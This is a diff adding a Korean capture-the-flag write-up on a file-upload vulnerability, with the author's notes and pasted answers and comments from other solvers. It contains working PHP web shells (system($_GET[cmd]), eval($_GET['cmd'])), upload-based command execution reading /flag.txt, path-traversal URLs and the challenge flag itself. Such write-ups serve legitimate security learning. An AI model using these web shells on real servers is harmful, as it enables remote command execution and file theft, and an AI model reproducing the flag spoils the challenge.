@@ -1,0 +1,98 @@
+DH{c29f44ea17b29d8b76001f32e8997bab}
+
+file upload의 취약점을 이용해 공격해 보는 문제이다.
+
+제일 먼저 파일의 이름을 이용해서 공격하려 했으나 ../이 파일이름에 포함시킬수 없기 때문에 파일의 이름으로 공격을 불가능했다.
+
+그 이후, 제일 먼저 파일의 내용이 실행 될수 있는지 실험해봤다.
+
+입력 : test.html
+    파일 이름 : test.html
+    파일 내용 : <script>alert(1);</script>
+
+입력 : test.php
+    파일 이름 : test.php
+    파일 내용 : <?php
+                system("ls");
+                ?>
+
+파일을 업로드 후 이 파일의 내용을 읽으려고 불러오는 과정에서 파일 내부의 코드들이 실행되는 것을 확인할 수 있었다.
+찾아야 하는 파일은 flag.txt이다.
+
+php의 system 함수를 이용해 flag.txt의 위치를 확인한다.
+ls, find, location등을 이용하면 된다.
+
+파일은 루트 디렉터리에 있었고 이제 이 파일의 내용을 읽어오면 flag를 획득할 수 있다.
+
+<?php 
+    system("cat /flag.txt");
+?>
+
+<?php
+    $flag = file_get_contents('/flag.txt', true);
+    echo $flag;
+?>
+
+<?php eval($_GET['cmd'])?>
+등등
+
+
+다른 사람들 답 :
+    File Upload 취약점을 이용하여 flag.txt 파일의 내용을 읽어야 하는 문제입니다. 가장 처음 시도한 방법은 파일 이름에 …/와 같은 상위 디렉터리로 이동할 수 있는 문자를 삽입하려고 하였으나 생각한 결과를 얻을 수 없었습니다.
+
+    두 번째로 시도한 방법은 첫 번째 방법에서 php 파일을 사용하던 중 system 함수를 사용할 수 있다는 것을 확인할 수 있었기에 해당 함수를 사용해보았습니다. 처음에는 파일을 업로드 하였을 때 uploads 폴더에 업로드 되길래 그 상위 directory에 있을 것이라 생각하였는데 찾을 수 없었어서 아래와 같이 최상위 directory에 접근하여 flag를 획득할 수 있었습니다.
+
+    <?php
+    system("cat ../../../../../../flag.txt");
+    ?>
+
+    구글링으로 웹쉘 코드 찾은다음 웹쉘 업로드 후 실행. 그리고 cat /flag.txt하면 끝
+
+    2020.10.03. 09:01
+
+    댓글 2개
+
+    댓글 내용을 작성해주세요.
+    Lv.13 Sechack 2020.11.24. 21:31:23 
+    cat /flag.txt가 정석이죠. 근데 저는 구글에 있는 웹 셸 코드를 사용해서 풀었습니다. 웹 셸이 실행되면 OS command를 서버에서 실행할 수 있게 됩니다. 따라서 저는 웹 셸을 업로드해서 실행한 뒤 cat /flag.txt를 쳐서 풀었습니다.
+    https://namkisec.tistory.com/entry/%EA%B5%AC%EA%B8%80%ED%95%B4%ED%82%B9
+
+
+    ?.php 형태와 같이
+    <?php
+    system($_GET[cmd]);
+    ?>
+    와 같은 매우 간단한 웹셀을 제작후 해당 파일을 업로드 한다.
+
+    그 후 /uploads/1.php?cmd=ls%20…/…/…/…/로 디렉토리들을 확인하며 flag.txt의 위치를 확인한다.
+
+    /uploads/1.php?cmd=cat%20…/…/…/…/flag.txt
+
+
+    <?php
+    $myfile = fopen("/flag.txt", "r") or die("Unable to open file!");
+    echo fread($myfile,filesize("/flag.txt"));
+    fclose($myfile);
+    ?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
